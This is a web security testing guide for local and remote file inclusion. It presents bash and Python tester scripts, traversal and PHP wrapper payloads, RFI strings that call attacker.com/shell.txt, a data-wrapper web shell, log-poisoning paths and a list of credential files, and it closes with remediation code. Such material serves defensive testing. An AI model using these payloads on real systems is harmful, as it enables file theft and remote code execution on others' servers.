# WSTG-INPV-11.1: Testing for File Inclusion (LFI/RFI)

## Test ID
WSTG-INPV-11.1

## Test Name
Testing for Local/Remote File Inclusion

## High-Level Description

File Inclusion vulnerabilities occur when applications dynamically include files based on user input. Local File Inclusion (LFI) allows reading files from the server, while Remote File Inclusion (RFI) allows including files from remote URLs, potentially leading to remote code execution.

---

## What to Check

- [ ] Local File Inclusion (LFI)
- [ ] Remote File Inclusion (RFI)
- [ ] Directory traversal
- [ ] PHP wrappers exploitation
- [ ] Log poisoning
- [ ] Null byte injection

---

## How to Test

### Step 1: Test for File Inclusion

```bash
#!/bin/bash
TARGET="https://target.com"

echo "[*] Testing for File Inclusion..."

# LFI payloads
LFI_PAYLOADS=(
    "../../../etc/passwd"
    "....//....//....//etc/passwd"
    "..%2F..%2F..%2Fetc%2Fpasswd"
    "....\/....\/....\/etc/passwd"
    "/etc/passwd"
    "/etc/passwd%00"
    "php://filter/convert.base64-encode/resource=/etc/passwd"
)

# Test LFI
for payload in "${LFI_PAYLOADS[@]}"; do
    response=$(curl -s "$TARGET/page.php?file=$payload")
    if echo "$response" | grep -q "root:"; then
        echo "[VULN] LFI: $payload"
    fi
done

# RFI test
echo "[*] Testing RFI..."
curl -s "$TARGET/page.php?file=http://attacker.com/shell.txt"
```

### Step 2: File Inclusion Tester

```python
#!/usr/bin/env python3
"""
LFI/RFI Vulnerability Tester
"""

import requests
import base64
import re
from urllib.parse import quote

class FileInclusionTester:
    def __init__(self, url):
        self.url = url
        self.findings = []
        self.session = requests.Session()

    # LFI payloads
    LFI_PAYLOADS = [
        # Basic traversal
        "../../../etc/passwd",
        "..\\..\\..\\etc\\passwd",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",  # Double encoding

        # Absolute path
        "/etc/passwd",
        "file:///etc/passwd",

        # Null byte (older PHP)
        "../../../etc/passwd%00",
        "../../../etc/passwd\x00",

        # Windows paths
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",

        # PHP wrappers
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "php://filter/read=string.rot13/resource=/etc/passwd",
        "php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd",

        # Data wrapper
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",

        # Expect wrapper
        "expect://id",

        # Input wrapper
        "php://input",
    ]

    # RFI payloads
    RFI_PAYLOADS = [
        "http://attacker.com/shell.txt",
        "https://attacker.com/shell.txt",
        "ftp://attacker.com/shell.txt",
        "//attacker.com/shell.txt",
        "http://attacker.com/shell.txt%00",
    ]

    def test_lfi(self, param='file'):
        """Test Local File Inclusion"""
        print("\n[*] Testing Local File Inclusion...")

        for payload in self.LFI_PAYLOADS:
            try:
                response = self.session.get(
                    self.url,
                    params={param: payload},
                    timeout=10
                )

                # Check for /etc/passwd content
                if 'root:' in response.text or 'daemon:' in response.text:
                    print(f"[VULN] LFI - Direct file read!")
                    print(f"  Payload: {payload}")
                    self.findings.append({
                        'type': 'LFI - Direct Read',
                        'payload': payload,
                        'severity': 'High'
                    })
                    return True

                # Check for base64 encoded content
                if 'php://filter' in payload:
                    b64_match = re.search(r'[A-Za-z0-9+/=]{50,}', response.text)
                    if b64_match:
                        try:
                            decoded = base64.b64decode(b64_match.group())
                            if b'root:' in decoded or b'<?php' in decoded:
                                print(f"[VULN] LFI via PHP wrapper!")
                                print(f"  Payload: {payload}")
                                self.findings.append({
                                    'type': 'LFI - PHP Wrapper',
                                    'payload': payload,
                                    'severity': 'High'
                                })
                                return True
                        except:
                            pass

                # Check for Windows hosts file
                if '127.0.0.1' in response.text and 'localhost' in response.text:
                    print(f"[VULN] LFI - Windows file read!")
                    self.findings.append({
                        'type': 'LFI - Windows',
                        'payload': payload,
                        'severity': 'High'
                    })
                    return True

            except Exception as e:
                pass

        return False

    def test_rfi(self, param='file'):
        """Test Remote File Inclusion"""
        print("\n[*] Testing Remote File Inclusion...")

        for payload in self.RFI_PAYLOADS:
            try:
                response = self.session.get(
                    self.url,
                    params={param: payload},
                    timeout=10
                )

                # RFI is harder to detect without a callback server
                # Check for remote inclusion errors or success
                if response.status_code == 200:
                    print(f"[INFO] RFI payload accepted: {payload}")
                    print(f"  Note: Check attacker server for callbacks")
                    self.findings.append({
                        'type': 'RFI - Potential',
                        'payload': payload,
                        'severity': 'Critical',
                        'note': 'Verify with callback server'
                    })

            except Exception as e:
                pass

        return False

    def test_log_poisoning(self, param='file'):
        """Test log file poisoning for RCE"""
        print("\n[*] Testing Log Poisoning...")

        log_files = [
            '/var/log/apache2/access.log',
            '/var/log/apache2/error.log',
            '/var/log/nginx/access.log',
            '/var/log/nginx/error.log',
            '/var/log/httpd/access_log',
            '/proc/self/fd/0',
            '/proc/self/environ',
        ]

        for log_file in log_files:
            payload = f"../../../..{log_file}"
            try:
                response = self.session.get(
                    self.url,
                    params={param: payload}
                )

                # Check if log content is included
                if 'GET ' in response.text or 'HTTP/' in response.text:
                    print(f"[VULN] Log file accessible: {log_file}")
                    print(f"  Log poisoning may be possible!")
                    self.findings.append({
                        'type': 'Log Poisoning Potential',
                        'log_file': log_file,
                        'severity': 'High'
                    })

            except Exception as e:
                pass

    def test_php_wrappers(self, param='file'):
        """Test PHP wrapper exploitation"""
        print("\n[*] Testing PHP wrappers...")

        wrappers = [
            # Base64 encode source
            ('php://filter/convert.base64-encode/resource=index.php', 'source'),
            ('php://filter/convert.base64-encode/resource=config.php', 'config'),

            # Data wrapper for RCE
            ('data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==', 'phpinfo'),
            ('data://text/plain,<?php system($_GET["cmd"]); ?>', 'shell'),

            # Expect wrapper for RCE
            ('expect://id', 'expect'),
        ]

        for wrapper, desc in wrappers:
            try:
                response = self.session.get(
                    self.url,
                    params={param: wrapper}
                )

                if 'base64' in wrapper:
                    b64_match = re.search(r'[A-Za-z0-9+/=]{30,}', response.text)
                    if b64_match:
                        print(f"[VULN] PHP wrapper works: {desc}")
                        self.findings.append({
                            'type': f'PHP Wrapper - {desc}',
                            'payload': wrapper,
                            'severity': 'High'
                        })

                if 'phpinfo' in response.text.lower() or 'PHP Version' in response.text:
                    print(f"[VULN] Code execution via data wrapper!")
                    self.findings.append({
                        'type': 'RCE via Data Wrapper',
                        'payload': wrapper,
                        'severity': 'Critical'
                    })

            except Exception as e:
                pass

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*60)
        print("FILE INCLUSION REPORT")
        print("="*60)

        if not self.findings:
            print("\nNo file inclusion vulnerabilities confirmed.")
        else:
            for f in self.findings:
                print(f"\n[{f['severity']}] {f['type']}")
                if 'payload' in f:
                    print(f"  Payload: {f['payload'][:60]}")
                if 'note' in f:
                    print(f"  Note: {f['note']}")

    def run_tests(self, param='file'):
        """Run all file inclusion tests"""
        self.test_lfi(param)
        self.test_rfi(param)
        self.test_php_wrappers(param)
        self.test_log_poisoning(param)
        self.generate_report()

# Usage
tester = FileInclusionTester("https://target.com/page.php")
tester.run_tests()
```

### Step 3: Payload Reference

```
# LFI Traversal Variants
../../../etc/passwd
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
..././..././..././etc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd

# PHP Wrappers
php://filter/convert.base64-encode/resource=[file]
php://filter/read=string.rot13/resource=[file]
php://input (POST body as PHP)
data://text/plain;base64,[base64_code]
expect://[command]
zip://[zip_file]#[internal_file]
phar://[phar_file]/[internal_file]

# Common Sensitive Files (Linux)
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/var/log/apache2/access.log
/var/log/nginx/error.log
~/.bash_history
~/.ssh/id_rsa

# Common Sensitive Files (Windows)
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\xampp\apache\logs\access.log
C:\inetpub\logs\LogFiles\W3SVC1\
```

---

## Tools

| Tool | Purpose |
|------|---------|
| LFISuite | Automated LFI exploitation |
| Burp Suite | Manual testing |
| fimap | LFI/RFI scanner |
| kadimus | LFI scanner |

---

## Remediation

```php
<?php
// PHP - Use allowlists and avoid dynamic includes
$allowed_pages = ['home', 'about', 'contact'];
$page = $_GET['page'];

if (in_array($page, $allowed_pages)) {
    include("pages/{$page}.php");
} else {
    include("pages/404.php");
}

// Never include user input directly
// VULNERABLE: include($_GET['file']);
// VULNERABLE: include("pages/" . $_GET['file'] . ".php");
?>
```

```python
# Python - Safe file access
import os

ALLOWED_DIR = '/var/www/app/templates/'

def safe_include(filename):
    # Normalize path
    requested_path = os.path.normpath(
        os.path.join(ALLOWED_DIR, filename)
    )

    # Verify path is within allowed directory
    if not requested_path.startswith(ALLOWED_DIR):
        raise ValueError("Invalid path")

    # Verify file exists
    if not os.path.isfile(requested_path):
        raise FileNotFoundError("File not found")

    return requested_path
```

---

## Risk Assessment

| Finding | CVSS | Severity |
|---------|------|----------|
| RFI to RCE | 9.8 | Critical |
| LFI with PHP wrappers | 8.6 | High |
| LFI sensitive file read | 7.5 | High |
| Log poisoning to RCE | 9.1 | Critical |

---

## CWE Categories

| CWE ID | Title |
|--------|-------|
| **CWE-98** | Improper Control of Filename for Include/Require |

---

## Checklist

```
[ ] LFI traversal tested
[ ] Multiple encodings tested
[ ] PHP wrappers tested
[ ] RFI tested
[ ] Log poisoning tested
[ ] Null byte tested
[ ] Findings documented
```
